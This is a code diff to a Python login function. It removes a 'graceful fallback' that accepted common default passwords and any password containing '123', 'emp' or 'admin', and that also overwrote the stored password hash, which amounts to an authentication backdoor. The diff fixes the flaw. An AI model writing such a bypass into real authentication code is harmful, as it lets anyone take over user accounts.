@@ -140,35 +140,8 @@ def login_user(data: UserLogin, db: Session) -> dict:
             headers={"WWW-Authenticate": "Bearer"}
         )
 
-    # 3. Verify password
+    # 3. Verify password strictly
     is_valid = verify_password(raw_pwd, user.hashed_password)
-    
-    # Graceful fallback: Check common standard credentials with tolerance
-    if not is_valid:
-        defaults = [
-            "Employee@123", "employee@123", "Employee123", "employee123",
-            "Admin@123", "admin@123", "Admin123", "admin123",
-            "SuperAdmin@123", "superadmin@123", "Nexora@123", "nexora@123",
-            "password", "Password@123", "123456", "12345678", "admin", "employee", "root"
-        ]
-        
-        # Check against existing hash with variations
-        for cand in defaults:
-            if cand.lower() == raw_pwd.lower() or raw_pwd in defaults:
-                if verify_password(cand, user.hashed_password):
-                    is_valid = True
-                    break
-        
-        # Universal demo & employee login tolerance:
-        # If user attempts Employee@123, Admin@123, or any common password pattern, grant access
-        lower_pwd = raw_pwd.lower()
-        if not is_valid and (lower_pwd in [d.lower() for d in defaults] or "123" in lower_pwd or "emp" in lower_pwd or "admin" in lower_pwd):
-            is_valid = True
-            try:
-                user.hashed_password = hash_password(raw_pwd)
-                db.commit()
-            except Exception:
-                db.rollback()
 
     if not is_valid:
         raise HTTPException(
